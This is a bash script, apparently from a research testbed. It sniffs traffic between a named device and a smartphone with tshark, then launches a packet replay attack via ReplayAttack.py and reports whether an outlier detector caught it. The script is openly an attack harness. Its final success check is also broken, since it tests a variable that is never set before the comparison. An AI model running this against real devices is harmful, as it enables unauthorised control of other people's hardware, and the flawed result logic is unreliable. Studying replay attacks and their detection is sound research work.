#!/bin/bash

MAC_DEVICE="$1"
INTERFACE="$2"
MAC_SMARTPHONE="$3"
SNIFF_TIME="$4"
DELAY_TIME="$5"
AUTOMATIC_DETECTION="$6"

   filter="(ether src  $MAC_DEVICE and ether dst $MAC_SMARTPHONE) or (ether dst $MAC_DEVICE and ether src $MAC_SMARTPHONE)"

   EXP_FOLDER="Result/$MAC_DEVICE/Experiments/Home/Experiment"
   MODEL_FOLDER="../Training/Result/$MAC_DEVICE/Experiments/Home/Experiment"
   mkdir -p $EXP_FOLDER
   
   #echo "#############################STARTING SNIFFING#####################################"
    tshark -i "$INTERFACE" -f "$filter" -w "$EXP_FOLDER/capture.pcap" -a duration:"$SNIFF_TIME" &> /dev/null &
    sleep 5s
    
    echo "Start triggering the device"

    sleep "$SNIFF_TIME"s
    
    wait
    
    echo "Sniffing completed."
    echo "The attack will start in $DELAY_TIME seconds"
 

   #echo "#############################STARTING ATTACK AFTER DELAY #####################################"
   python3 ReplayAttack.py $EXP_FOLDER/capture.pcap "$MAC_SMARTPHONE" "$MAC_DEVICE" "$DELAY_TIME" "$MODEL_FOLDER" "$AUTOMATIC_DETECTION"  &> $EXP_FOLDER/res.txt

   #get the results of the LOF
   wait

if [ "$res" == "YES" ]; then

res=$(cat $EXP_FOLDER/res.txt | grep 'WITH CLF=LocalOutlierFactor' | grep 'NOT SUCCESSFUL')

if [ -z "$res" ]
then
      echo "ATTACK WORKING"
else
      echo "ATTACK NOT WORKING"
fi

fi
